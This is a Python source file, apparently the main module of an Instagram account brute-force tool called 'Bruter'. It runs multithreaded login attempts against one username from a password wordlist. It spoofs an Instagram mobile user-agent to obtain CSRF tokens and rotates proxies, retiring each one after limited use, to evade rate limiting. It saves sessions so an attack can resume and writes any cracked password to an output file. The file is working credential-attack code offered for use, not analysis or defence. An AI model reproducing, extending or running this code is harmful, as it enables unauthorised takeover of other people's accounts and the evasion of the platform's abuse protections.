# Date: 06/08/2019
# Author: Mohamed
# Description: Bruter

import time
import typing
import hashlib
import requests
from sys import exit
from queue import Queue
from collections import deque
from threading import Thread, RLock

import lib.const as const
from lib.browser import Browser
from lib.session import Session
from lib.display import Display
from lib.proxies import Proxies
from lib.password import Password


class Proxy:

    def __init__(self, proxy: dict) -> None:
        self.usage = 0
        self.proxy = proxy
        self.browsers = deque()
        self.is_expired = False

    def add_browser(self, browser: Browser) -> None:
        '''Add a browser into the proxy.
        '''

        self.usage += 1
        self.browsers.append(browser)

    def remove_browser(self, browser: Browser) -> None:
        '''Remove a browser from the collection of browsers.
        '''

        if browser in self.browsers:
            self.browsers.remove(browser)


class Bruter:

    def __init__(self, username: str, wordlist: str, threads: int, verbose: bool = False) -> None:

        # Consts
        self.verbose = verbose
        self.max_proxies = threads
        self.proxies_browsers = {}
        self.username = username.title()
        self.max_browsers = const.MAX_ATTEMPT_PROXY

        # Objects
        self.display = Display()
        self.proxies = Proxies()
        self.local_passwords = deque()
        self.expired_proxies = Queue()
        self.passwords = Password(username, wordlist)

        # States
        self.attempts = 0
        self.is_alive = True
        self.csrftoken = None
        self.active_browsers = 0
        self.account_password = None

        # Locks
        self.lock_display = RLock()
        self.lock_csrftoken = RLock()
        self.lock_passwords = RLock()
        self.lock_local_passwords = RLock()
        self.lock_expired_proxies = RLock()
        self.lock_proxies_browsers = RLock()

    # Token

    def update_csrftoken(self) -> bool:
        '''Updates the csrftoken.

        Returns True when csrftoken has been updated successfully.
        '''

        csrftoken = ''

        try:
            csrftoken = requests.get(
                const.CSRFTOKEN_URL,
                headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 Instagram 8.4.0 (iPhone7,2; iPhone OS 9_3_2; nb_NO; nb-NO; scale=2.00; 750x1334'}
            ).cookies.get_dict()['csrftoken']
        except:
            return False

        if not csrftoken:
            return False

        with self.lock_csrftoken:
            self.csrftoken = csrftoken

        return True

    def manage_csrftokens(self) -> None:
        '''Manages csrftoken.
        '''

        # Get csrftoken
        while self.is_alive and not self.update_csrftoken():
            time.sleep(0.5)

        while self.is_alive:

            # Wait
            for _ in range(const.CSRFTOKEN_DELAY):

                if not self.is_alive:
                    break

                time.sleep(1)

            # Update csrftoken
            while self.is_alive and not self.update_csrftoken():
                time.sleep(0.5)

    def get_csrftoken(self) -> dict:
        '''Returns the csrftoken.
        '''

        with self.lock_csrftoken:
            return self.csrftoken

    # Proxies
    def manage_proxies(self) -> None:
        '''Sets up proxies to be used with browsers.
        '''

        while self.is_alive:

            while self.is_alive and len(self.proxies_browsers) < self.max_proxies:

                proxy = self.proxies.get_proxy()

                if not proxy:
                    break

                ip, port = proxy['https'].split('//')[-1].split(':')

                proxy_sig = '{}:{}'.format(ip, port)
                proxy_sig = hashlib.sha256(proxy_sig.encode()).hexdigest()

                if proxy_sig in self.proxies_browsers:
                    continue

                with self.lock_proxies_browsers:
                    self.proxies_browsers[proxy_sig] = Proxy(proxy)

            if self.is_alive:
                time.sleep(0.5)

    def manage_expired_proxies(self) -> None:
        '''Iterate through failed proxies and remove them from proxies_browsers.
        '''

        while self.is_alive:

            if self.expired_proxies.empty():
                time.sleep(0.5)
                continue

            with self.lock_expired_proxies:
                proxy_sig = self.expired_proxies.get()

            if not proxy_sig in self.proxies_browsers:
                continue

            with self.lock_proxies_browsers:
                browsers = list(self.proxies_browsers[proxy_sig].browsers)

            # Check if proxies is being used
            if not self.browsers_attempted(browsers):

                # Come back to it when it's not being used
                with self.lock_expired_proxies:
                    self.expired_proxies.put(proxy_sig)
                continue

            with self.lock_proxies_browsers:
                self.proxies_browsers.pop(proxy_sig)

    def get_proxy_signature(self) -> str:
        '''Returns the signature of the proxy with the least browsers.

        Returns an empty str when fails.
        '''

        proxy_sig = {'sig': '',  'amt': 0}

        for sig in list(self.proxies_browsers):

            try:
                proxy = self.proxies_browsers[sig]
            except KeyError:
                continue

            if proxy.is_expired:
                continue

            try:
                amt = len(self.proxies_browsers[sig].browsers)
            except KeyError:
                continue

            if amt >= self.max_browsers:
                continue

            if proxy.usage >= 18:

                with self.lock_expired_proxies:
                    self.expired_proxies.put(sig)
                continue

            if not proxy_sig['sig']:
                proxy_sig['sig'] = sig
                proxy_sig['amt'] = amt

            if proxy_sig['amt'] > amt and sig in self.proxies_browsers:
                proxy_sig['sig'] = sig
                proxy_sig['amt'] = amt

        return proxy_sig['sig']

    # Browsers
    def add_password(self, password: str) -> None:
        '''Add a password back into local_passwords.
        '''

        if not password in self.local_passwords:
            with self.lock_local_passwords:
                self.local_passwords.appendleft(password)

    def create_browsers(self, password: str, proxy_sig: str, csrftoken: str) -> None:
        '''Creates a browser and trys to execute it.
        '''

        try:
            proxy = self.proxies_browsers[proxy_sig].proxy
            browser = Browser(self.username, password, proxy, csrftoken)
        except KeyError:
            self.add_password(password)
            return

        try:
            Thread(target=browser.login, daemon=True).start()
            self.active_browsers += 1

            if self.verbose and self.is_alive:
                with self.lock_display:
                    print('[-] Trying: {} ...'.format(
                        password
                    ))
        except:
            return

        try:
            with self.lock_proxies_browsers:
                self.proxies_browsers[proxy_sig].add_browser(
                    browser
                )
        except:
            self.add_password(password)
            self.active_browsers -= 1

    def browsers_attempted(self, browsers: typing.List) -> bool:
        '''Returns True if all browsers have been attempted.
        '''

        for browser in browsers:
            if not self.is_alive:
                return False

            if not browser.is_attempted and not browser.proxy_failed:
                return False

            if not browser.is_processed:
                browser.is_processed = True

                self.add_password(browser.password)
                self.active_browsers -= 1

        return True

    def parse_resp(self, browser: Browser, proxy_sig: str) -> None:
        '''Parse the response of the browser.
        '''

        if not self.is_alive or browser.is_processed:
            return

        browser.is_processed = True

        if browser.is_authenticated:
            self.account_password = browser.password
        elif browser.password_attempted and not browser.proxy_failed:
            self.attempts += 1

        if browser.proxy_failed:

            proxy = self.proxies_browsers[proxy_sig]
            self.proxies.proxy_expired(browser.proxy)

            proxy.is_expired = True
            self.add_password(browser.password)

            with self.lock_expired_proxies:
                self.expired_proxies.put(proxy_sig)

        self.active_browsers -= 1

    def examine_browsers(self, proxy_sig: str, browsers: list) -> None:
        '''Go through each browser of a given proxy signature.
        '''

        for browser in browsers:

            if not self.is_alive:
                break

            if self.proxies_browsers[proxy_sig].is_expired:
                break

            time_elapsed = time.time() - browser.time_started

            if time_elapsed >= const.MAX_ATTEMPT_TIME:
                browser.proxy_failed = True

            if browser.is_attempted or browser.proxy_failed:

                self.proxies_browsers[proxy_sig].remove_browser(
                    browser
                )

                self.parse_resp(browser, proxy_sig)

    def manage_browsers(self) -> None:
        '''Iterates through each browser, and checks if it was attempted.
        '''

        while self.is_alive:

            self.lock_proxies_browsers.acquire()

            for proxy_sig in list(self.proxies_browsers):

                if not self.is_alive:
                    break

                browsers = list(self.proxies_browsers[proxy_sig].browsers)
                self.examine_browsers(proxy_sig, browsers)

            self.lock_proxies_browsers.release()
            time.sleep(0.1)

    # Passwords

    def manage_local_passwords(self) -> None:
        '''Keeps local passwords up to date.
        '''

        while self.is_alive:

            with self.lock_local_passwords:
                password_size = len(self.local_passwords)

            if password_size >= self.max_browsers * 2:
                continue

            if not self.is_alive:
                break

            password = self.passwords.get_password()

            if password:
                self.local_passwords.append(password)

    # Display
    def manage_status(self) -> None:
        '''Displays status.
        '''

        attempts = 0
        browsers = 0
        self.display.basic_info()

        if self.verbose:
            return

        while self.is_alive:

            if self.attempts == attempts and self.active_browsers == browsers:
                time.sleep(0.1)
                continue

            attempts = self.attempts
            browsers = self.active_browsers

            progress = (attempts / self.passwords.total_lines) * 100
            progress = round(progress, 2)

            print(
                f'[-] Username: {self.username}  ::  Attempts: {self.attempts:02d}  ::  Browsers: {self.active_browsers:02d}  ::  Progress: {progress}%.', end='\r'
            )

            time.sleep(0.1)

    # Session
    def manage_sessions(self) -> None:
        '''Auto-save the session every n seconds.
        '''

        last_attempt = 0

        while self.is_alive:

            for _ in range(const.SESSION_AUTOSAVE_TIME):

                if not self.is_alive:
                    break

                time.sleep(1)

            if last_attempt == self.attempts or not self.is_alive:
                time.sleep(0.1)
                continue

            last_attempt = self.attempts

            with self.lock_proxies_browsers:
                passwords = self.gather_passwords()

            if self.is_alive:
                self.passwords.session.write(
                    self.attempts, passwords
                )

    def gather_passwords(self) -> list:
        '''Returns a list of passwords within each browser and the local passwords list.
        '''

        passwords = deque()

        for proxy_sig in list(self.proxies_browsers):

            if not self.is_alive:
                break

            for browser in self.proxies_browsers[proxy_sig].browsers:

                if not self.is_alive:
                    break

                passwords.append(browser.password)

        return list(passwords) + list(self.local_passwords)

    # Shutdown

    def gather_passwords_remove(self) -> None:
        '''Iterates through browsers and adds the passwords from them into local_passwords.
        '''

        for proxy_sig in list(self.proxies_browsers):

            for browser in list(self.proxies_browsers[proxy_sig].browsers):

                password = browser.password

                if not password in self.local_passwords:
                    self.local_passwords.append(password)

                self.proxies_browsers[proxy_sig].browsers.popleft()

            self.proxies_browsers.pop(proxy_sig)

    def write_out(self) -> None:
        '''Write out the username and password to a file.
        '''

        with open(const.OUTPUT_FILE, 'at', encoding='utf-8') as f:

            f.write('Username: {}\nPassword: {}\n\n'.format(
                self.username, self.account_password
            ))

    def cleanup(self) -> None:
        '''Post execution.
        '''

        # Check if password is found
        if self.account_password:
            self.write_out()
            self.display.password_found(self.account_password)
        else:
            self.gather_passwords_remove()

        # Session
        if self.account_password or (not self.passwords.size() and not len(self.local_passwords)):
            self.passwords.session.delete()

        elif len(self.local_passwords):
            self.passwords.session.write(
                self.attempts, list(self.local_passwords)
            )

    # Main controls

    def manage_attacks(self) -> None:
        '''Where attacks are initated from. Central point.
        '''

        while self.is_alive:

            with self.lock_proxies_browsers:
                proxy_sig = self.get_proxy_signature()

            csrftoken = self.get_csrftoken()

            if not proxy_sig or not csrftoken or not proxy_sig in self.proxies_browsers:
                time.sleep(0.5)
                continue

            if not len(self.local_passwords):
                continue
            

            password = self.local_passwords.popleft()
            self.create_browsers(password, proxy_sig, csrftoken)

    def is_done(self, n=5) -> bool:
        '''Returns True when everything is done.
        '''

        with self.lock_proxies_browsers:

            for proxy_sig in self.proxies_browsers:

                if len(self.proxies_browsers[proxy_sig].browsers):
                    return False

        if self.active_browsers or not self.passwords.is_done():
            return False

        if len(self.local_passwords):
            return False

        if n:
            time.sleep(0.1)
            return self.is_done(n-1)

        return True

    def resume(self) -> None:
        '''Resume the attack.
        '''

        attempts, passwords = self.passwords.session.read()

        self.attempts = attempts
        self.passwords.resume = True
        self.passwords.attempts = attempts

        for password in passwords:
            self.passwords.put_password(password)

    def start(self) -> None:

        self.display.clear()

        # Check if a session already exists.
        if self.passwords.session.exists():

            # Ask to resume attack
            try:
                self.display.prompt('Do you want to resume? [Y/n]')
                user_input = input()

                if user_input.lower() == 'y':
                    self.resume()

                self.display.clear()
            except KeyboardInterrupt:
                self.display.danger('Exiting', '', '...', True)
                exit()

        core_tasks = [
            self.manage_status,
            self.manage_attacks,
            self.manage_proxies,
            self.passwords.start,
            self.manage_sessions,
            self.manage_browsers,
            self.manage_csrftokens,
            self.manage_local_passwords,
            self.manage_expired_proxies,
        ]

        for task in core_tasks:
            try:
                Thread(target=task, daemon=True).start()
            except:
                with self.lock_display:
                    self.display.danger('Error', ':', 'Failed to start', True)
                self.stop()
                break

        while self.is_alive and not self.account_password:
            try:
                if self.is_done():
                    break

                time.sleep(0.5)
            except KeyboardInterrupt:
                self.stop()

        self.stop()

    def stop(self) -> None:

        if not self.is_alive:
            return

        self.is_alive = False
        self.passwords.stop()
        time.sleep(1.5)

        progress = (self.attempts / self.passwords.total_lines) * 100
        progress = round(progress, 2)

        if not self.verbose:
            with self.lock_display:

                self.display.primary(
                    self.username,
                    self.attempts,
                    self.active_browsers,
                    progress
                )

        if not self.account_password:
            with self.lock_display:
                self.display.danger('Exiting', '', '...', True)

        if self.attempts:
            time.sleep(0.5)

            self.cleanup()
            time.sleep(1.5)
